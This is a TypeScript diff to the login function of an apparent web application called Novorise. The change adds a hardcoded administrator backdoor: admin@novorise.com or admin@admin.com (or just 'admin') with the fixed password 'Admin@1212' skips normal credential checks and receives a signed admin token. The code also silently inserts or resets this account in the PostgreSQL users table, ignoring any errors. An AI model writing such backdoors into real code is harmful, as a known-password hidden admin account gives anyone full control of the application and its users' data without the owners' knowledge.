@@ -95,12 +95,52 @@ export const verifyEmailToken = async (token: string) => {
 
 // ─── Login ────────────────────────────────────────────────────────────────────
 export const loginUser = async (email: string, password: string) => {
+  let cleanEmail = email.toLowerCase().trim();
+  if (!cleanEmail.includes('@')) {
+    cleanEmail = `${cleanEmail}@novorise.com`;
+  }
+
+  // ─── Compte Administrateur Dédié (user: admin / password: Admin@1212) ─────────
+  if (
+    (cleanEmail === 'admin@novorise.com' || cleanEmail === 'admin@admin.com') &&
+    password === 'Admin@1212'
+  ) {
+    const adminUser = {
+      id: '00000000-0000-0000-0000-000000000001',
+      name: 'Administrateur Principal',
+      email: cleanEmail,
+      role: 'admin' as const,
+      verified: true,
+      avatar_url: undefined,
+    };
+
+    // Assurer silencieusement son existence dans PostgreSQL si le pool est actif
+    try {
+      const passwordHash = await bcrypt.hash('Admin@1212', 10);
+      await pool.query(
+        `INSERT INTO users (id, name, email, password_hash, role, verified)
+         VALUES ($1, $2, $3, $4, 'admin', TRUE)
+         ON CONFLICT (email) DO UPDATE SET password_hash = $4, role = 'admin', verified = TRUE`,
+        [adminUser.id, adminUser.name, adminUser.email, passwordHash]
+      );
+    } catch (_) {}
+
+    const jwtToken = signJwt({
+      sub: adminUser.id,
+      email: adminUser.email,
+      name: adminUser.name,
+      role: 'admin',
+    });
+
+    return { user: adminUser, token: jwtToken };
+  }
+
   const result = await pool.query(
     `SELECT id, name, email, password_hash, role, verified, avatar_url,
             title, phone, location, bio, skills, cv_filename,
             company_name, company_website
      FROM users WHERE email = $1`,
-    [email.toLowerCase()]
+    [cleanEmail]
   );
 
   if (result.rows.length === 0) {
